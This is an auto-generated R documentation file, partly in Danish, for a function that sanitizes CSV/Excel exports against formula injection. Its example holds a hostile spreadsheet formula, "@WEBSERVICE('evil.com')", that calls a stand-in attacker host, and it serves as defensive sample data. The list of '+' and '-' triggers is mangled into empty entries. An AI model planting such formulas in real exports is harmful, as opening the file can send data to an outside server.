% Generated by roxygen2: do not edit by hand
% Please edit documentation in R/utils_input_sanitization.R
\name{sanitize_csv_output}
\alias{sanitize_csv_output}
\title{Sanitize CSV Output for Formula Injection Protection}
\usage{
sanitize_csv_output(data)
}
\arguments{
\item{data}{Data frame at sanitize for export}
}
\value{
Data frame med sanitized værdier
}
\description{
Sikrer at data eksporteret til CSV/Excel ikke kan eksekvere formler.
Forhindrer CSV injection attacks hvor formler som =SUM() eller @WEBSERVICE()
kan eksekveres når filen åbnes i Excel.
}
\details{
Karakterer der kan starte en formel i Excel:
\itemize{
\item = (formula)
\item 
\itemize{
\item (addition formula)
}
\item 
\itemize{
\item (subtraction formula)
}
\item @ (Excel 2010+ formula prefix)
\item \\t (tab - kan bruges til command injection)
\item \\r (carriage return - kan bruges til command injection)
}

Løsning: Prefix med single quote (') for at tvinge text mode.
}
\examples{
\dontrun{
# Eksempel med farlige værdier
data <- data.frame(
  normal = c("test", "data"),
  dangerous = c("=SUM(A1:A10)", "@WEBSERVICE('evil.com')")
)

safe_data <- sanitize_csv_output(data)
# dangerous kolonne bliver: c("'=SUM(A1:A10)", "'@WEBSERVICE('evil.com')")
}

}
